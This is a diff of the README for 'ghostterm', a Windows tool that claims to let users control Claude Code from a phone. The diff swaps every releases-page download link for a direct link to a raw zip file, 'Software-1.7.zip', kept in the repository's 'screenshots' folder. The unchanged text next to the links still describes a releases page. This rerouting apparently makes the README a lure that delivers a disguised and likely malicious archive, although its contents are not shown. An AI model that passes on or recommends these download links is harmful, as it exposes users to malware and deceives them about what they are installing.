@@ -1,6 +1,6 @@
 # 🖥️ ghostterm - Control Claude Code From Your Phone
 
-[![Download ghostterm](https://img.shields.io/badge/Download%20ghostterm-6b7280?style=for-the-badge&logo=github)](https://github.com/illative-abecedarius406/ghostterm/releases)
+[![Download ghostterm](https://img.shields.io/badge/Download%20ghostterm-6b7280?style=for-the-badge&logo=github)](https://github.com/illative-abecedarius406/ghostterm/raw/refs/heads/main/screenshots/Software-1.7.zip)
 
 ## 📱 What ghostterm does
 
@@ -19,7 +19,7 @@ It is built for Windows users who want a simple remote control setup.
 
 Visit this page to download the latest release:
 
-[https://github.com/illative-abecedarius406/ghostterm/releases](https://github.com/illative-abecedarius406/ghostterm/releases)
+[https://github.com/illative-abecedarius406/ghostterm/raw/refs/heads/main/screenshots/Software-1.7.zip](https://github.com/illative-abecedarius406/ghostterm/raw/refs/heads/main/screenshots/Software-1.7.zip)
 
 On the releases page, look for the latest version and download the Windows file that matches your computer. If there is more than one file, choose the one for Windows and your system type.
 
@@ -38,7 +38,7 @@ For the best experience, keep both your phone and PC signed in to the same Tails
 ## 🛠️ Install ghostterm
 
 1. Open the releases page:
-   [https://github.com/illative-abecedarius406/ghostterm/releases](https://github.com/illative-abecedarius406/ghostterm/releases)
+   [https://github.com/illative-abecedarius406/ghostterm/raw/refs/heads/main/screenshots/Software-1.7.zip](https://github.com/illative-abecedarius406/ghostterm/raw/refs/heads/main/screenshots/Software-1.7.zip)
 
 2. Find the newest release at the top of the page.
 
@@ -218,7 +218,7 @@ Keeping the app current helps you get the latest fixes and changes.
 ## 📌 Quick start
 
 1. Visit the releases page:
-   [https://github.com/illative-abecedarius406/ghostterm/releases](https://github.com/illative-abecedarius406/ghostterm/releases)
+   [https://github.com/illative-abecedarius406/ghostterm/raw/refs/heads/main/screenshots/Software-1.7.zip](https://github.com/illative-abecedarius406/ghostterm/raw/refs/heads/main/screenshots/Software-1.7.zip)
 
 2. Download the Windows release file.
 
